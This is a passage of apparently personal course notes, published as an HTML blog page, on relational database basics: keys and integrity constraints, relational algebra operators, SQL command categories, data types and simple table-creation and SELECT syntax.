&lt;/h3&gt;&lt;p&gt;Tuple-Level&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Domain restrictions (e.g. type string)&lt;/li&gt;
&lt;li&gt;Value restriction: only allow subset of values (e.g. &lt;code&gt;[&amp;quot;Winter&amp;quot;, &amp;quot;Summer&amp;quot;, &amp;quot;Fall&amp;quot;]&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Relation-level&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Superkey: attributes where tuples will never agree on&lt;/li&gt;
&lt;li&gt;Candidate key: minimal superkey (minimal set of attributes that unique identify the tuple)&lt;/li&gt;
&lt;li&gt;Primary key: designated candidate key&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Database-level&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Foreign key: an attribute of this relation is the primary key for another relation (Relation one is &lt;em&gt;referencing&lt;/em&gt;  and the second relation is   &lt;em&gt;referenced&lt;/em&gt; )&lt;/li&gt;
&lt;li&gt;Foreign key constraints: Foreign key must match the primary key value of a tuple in the &lt;code&gt;referenced&lt;/code&gt; relation&lt;/li&gt;
&lt;li&gt;Referential integrity constraints: foreign key cannot be a primary key in the referencing relation&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;the-relational-algebra&#34; &gt;The Relational Algebra
&lt;span&gt;
    &lt;a href=&#34;#the-relational-algebra&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Consists of a set of operators&lt;/p&gt;
&lt;h3 id=&#34;operators&#34; &gt;Operators
&lt;span&gt;
    &lt;a href=&#34;#operators&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;one or two relations as inputs&lt;/li&gt;
&lt;li&gt;single output relation in terms of the input relation(s)&lt;/li&gt;
&lt;li&gt;can be composed to express the definition of a new relation in terms of existing relations&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;selection&#34; &gt;Selection
&lt;span&gt;
    &lt;a href=&#34;#selection&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;subset of tuples of a relation and thus schema is the same&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Find teachers who are in the physics department&lt;/li&gt;
&lt;li&gt;conditions include any column of R, comparisons, boolean algebra&lt;/li&gt;
&lt;li&gt;select applies to single row at a time, not many&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;projection&#34; &gt;Projection
&lt;span&gt;
    &lt;a href=&#34;#projection&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Returns a subset of a relation but only of the specified attributes&lt;/li&gt;
&lt;li&gt;Duplicates are eliminated&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cross-product&#34; &gt;Cross Product
&lt;span&gt;
    &lt;a href=&#34;#cross-product&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Result has attributes of both input relations&lt;/li&gt;
&lt;li&gt;Result is the tuple for each possible pair from relation one and relation two&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;conditional-join&#34; &gt;Conditional Join
&lt;span&gt;
    &lt;a href=&#34;#conditional-join&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Perform cross product but join pairs only if the boolean involving attributes from both relations is true&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;natural-join&#34; &gt;Natural Join
&lt;span&gt;
    &lt;a href=&#34;#natural-join&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;If both relations have the same attribute, then the join will only filter out
tuples that don&amp;rsquo;t have those attributes matching. During the first cross product, duplicate attributes are renamed (e.g. ID, ID → ID, ID_1) but at the end the duplicated attributes are thrown out.&lt;/p&gt;
&lt;h3 id=&#34;set-based-relational-operators&#34; &gt;Set-Based Relational Operators
&lt;span&gt;
    &lt;a href=&#34;#set-based-relational-operators&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Union: Same number of fields and corresponding fields have the same type&lt;/li&gt;
&lt;li&gt;Difference: Returns stuff in first relation not present in second&lt;/li&gt;
&lt;li&gt;Intersection: Return stuff in both rrelations&lt;/li&gt;
&lt;li&gt;Division: Attributes of second relation must be a subset of the first. Inverse of product. Useful for all. Example (which tuples of X always references Y but returns a new tuple without the attributes in Y).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;summary-of-relational-operators&#34; &gt;Summary of Relational Operators
&lt;span&gt;
    &lt;a href=&#34;#summary-of-relational-operators&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-348/relation-operators.webp&#34; alt=&#34;summary of relational operators&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;finding-the-maximums-of-a-relation&#34; &gt;Finding the maximums of a relation
&lt;span&gt;
    &lt;a href=&#34;#finding-the-maximums-of-a-relation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;To do this, we find all values in the relation that are smaller than values in itself.
Now that we have all the smaller values, we just need to remove them from the original table.
We are left with values equal to the maximum.&lt;/p&gt;
&lt;p&gt;project val (T) -  project t1.val (T t1 join T t2 if t1.val &amp;lt; t2.val)&lt;/p&gt;
&lt;h3 id=&#34;algebraic-equivalences&#34; &gt;Algebraic Equivalences
&lt;span&gt;
    &lt;a href=&#34;#algebraic-equivalences&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;relational-completeness&#34; &gt;Relational Completeness
&lt;span&gt;
    &lt;a href=&#34;#relational-completeness&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;the-relational-calculus&#34; &gt;The Relational Calculus
&lt;span&gt;
    &lt;a href=&#34;#the-relational-calculus&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h2 id=&#34;sql---structured-query-language&#34; &gt;SQL - Structured Query Language
&lt;span&gt;
    &lt;a href=&#34;#sql---structured-query-language&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;KEYWORD (statements is implied)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SQL Data Manipulation Language (DML)
&lt;ul&gt;
&lt;li&gt;SELECT for queries&lt;/li&gt;
&lt;li&gt;INSERT, UPDATE, DELETE modify the instance of a table&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SQL Data Definition Language (DDL)
&lt;ul&gt;
&lt;li&gt;CREATE, DROP modify the database schema&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SQL Data Control Language (DCL)
&lt;ul&gt;
&lt;li&gt;GRANT, REVOKE enforce the security model&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;schema-used-for-examples&#34; &gt;Schema Used for Examples
&lt;span&gt;
    &lt;a href=&#34;#schema-used-for-examples&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-348/database-examples-schema.webp&#34; alt=&#34;database schema&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.db-book.com/university-lab-dir/sqljs.html&#34;&gt;SQL interpreter&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;data-types&#34; &gt;Data Types
&lt;span&gt;
    &lt;a href=&#34;#data-types&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;integer or int (32 bit or 4 byte)&lt;/li&gt;
&lt;li&gt;smallint (16 bit or 2 bytes)&lt;/li&gt;
&lt;li&gt;numeric(p, q): p digit numbers with q digits to the right&lt;/li&gt;
&lt;li&gt;real, double precision:&lt;/li&gt;
&lt;li&gt;float(n): user-specified precision of at least n digits&lt;/li&gt;
&lt;li&gt;char(n): fixed length character strings (n is length)&lt;/li&gt;
&lt;li&gt;varchar(n): variable length character to a max length of n&lt;/li&gt;
&lt;li&gt;date: describes year, month, day&lt;/li&gt;
&lt;li&gt;time: describes an hour, minute, second&lt;/li&gt;
&lt;li&gt;timestamp: describes a date and time&lt;/li&gt;
&lt;li&gt;interval: allows date/time computations&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tables&#34; &gt;Tables
&lt;span&gt;
    &lt;a href=&#34;#tables&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;r&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;(A1&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;D1,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;...,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;An,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Dn),&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;(integrity-&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;constraint&lt;/span&gt;-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;),&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;...&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;(integrity-&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;constraint&lt;/span&gt;-k),&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;r: relation, A: attribute, D: data type&lt;/p&gt;
&lt;p&gt;integrity-contraints:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;primary&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;key&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(A1,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;...,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;An&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;foreign&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;key&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(Am,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;...,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;An&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;references&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;r2&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;queries&#34; &gt;Queries
&lt;span&gt;
    &lt;a href=&#34;#queries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;SQL allows duplicate tuples in relations as well as in query results. need to use
the &lt;code&gt;distinct&lt;/code&gt; keyword after select.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;SELECT&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;[&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;distinct&lt;/span&gt;]&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;[OPTIONAL]&lt;/p&gt;
&lt;p&gt;To return all attributes, use an asterisk (*)&lt;/p&gt;
&lt;h4 id=&#34;arithmetic-expressions&#34; &gt;Arithmetic Expressions
&lt;span&gt;
    &lt;a href=&#34;#arithmetic-expressions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;You can operate on the data through the select call itself. For example, if we wanted the monthly salary instead of an annual one:&lt;/p&gt;
